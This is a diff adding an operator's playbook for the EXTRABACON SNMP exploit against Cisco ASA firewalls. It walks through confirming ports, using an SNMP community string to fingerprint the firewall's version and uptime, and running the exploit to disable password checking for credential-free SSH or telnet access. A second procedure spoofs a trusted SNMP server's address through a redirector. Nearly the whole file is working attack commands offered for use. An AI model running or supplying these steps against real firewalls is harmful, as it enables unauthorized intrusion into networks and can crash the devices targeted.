@@ -1,0 +1,77 @@
+#CISCO ASA SNMP exploit script
+#Works on most 8.x(y) versions through 8.4(4). Check documentation
+#Do not use against unknown or unsupported versions
+
+
+#We require certain information for this to work
+#You need to own a SNMP server in the config
+#Or be 100 percent certain of the targets version and uptime
+#EX: snmp-server host inside X.X.X.X community public
+#Community String EX: snmp-server community public (may be randon characters)
+#Ideally you should know the Version and Uptime of the FW. 
+#You can crash if it is freshly rebooted and has a long community string
+#Ports 161, 22 or 23
+
+
+#Lets make sure we have access to the right ports from the SNMP server
+-ping -r <TARGETIP> -t -p 23
+-ping -r <TARGETIP> -t -p 22
+
+
+#Awesome pings worked! Lets use the info sub command to get the information we need.
+#Community string is case sensitive
+u RHP TARGETIP 161
+python2.7 ./extrabacon_1.1.0.1.py info -t 127.0.0.1:<RHP> -c SNMPSTRING
+
+
+#If successful firewall uptime and version are confirmed. 
+#You will see the keyfile in the concerendparent directory
+#There are other ways to get this info as well...this is gee whiz info
+#snmpget -v 2c -c SNMPSTRING -r 0 127.0.0.1:RHP system.sysDescr.0
+#snmpget -v 2c -c SNMPSTRING -r 0 127.0.0.1:RHP system.sysUpTime.0
+#If it says unsupported in the keyfile area...dont throw BACON.
+EXAMPLE:
+#[-] target is running Cisco Adaptive Security Appliance Version 7.2(4), which is NOT supported
+#Data stored in key file  : unsupported
+#Data stored in self.vinfo: UNSUPPORTED
+
+#Assuming we are supported...lets rock on. 
+#We need to disable password checking so we can ssh or telnet on
+python2.7 ./extrabacon_1.1.0.1.py exec -k <KEYFILE> -t 127.0.0.1:<RHP> -c <SNMPSTRING> --mode pass-disable
+
+
+#Assuming this was a succes, you should be able to ssh on without creds
+
+
+#MAKE SURE TO ENABLE PASSWORD CHECKING. YOU CAN DO THIS DURING YOUR SSH/TELNET SESSION
+python2.7 ./extrabacon_1.1.0.1.py exec -k <KEYFILE> -t 127.0.0.1:<RHP> -c <SNMPSTRING> --mode pass-enable
+
+DONE.
+
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+
+
+#THE BELOW PROCEDURE IS AN OPTION IF YOU KNOW THE SNMP SERVER, BUT DON'T OWN IT
+#You will need to be absolutley sure of the version of the FW before attempting however
+#Do not try this if you are not 100% sure...the FW will crash the FW
+#The "info" sub command does not have a spoofing capability...only exec does.
+
+#Create a Key file with your version at the TOP
+#EXAMPLE: Lets say your target is an asa804 (or at least yout think
+vi /current/bin/FW/EXTRABACON/keys/1234.key
+echo asa804 > keys/1234.key
+
+
+#You will need to use a rawsend for this to work
+-rawsend RHP
+
+
+
+#Lets spoof...use no-health-check so it doesn't try to respond to your redirector
+python2.7 ./extrabacon.py exec -k 1234 -t <actualtargetIP>:161 -c public --mode pass-disable --spoof 127.0.0.1:RHP:<spoofedIP> --no-health-check
+
+#Repeat this if successful and logged on with the --mode pass-enable
+
+
+
+
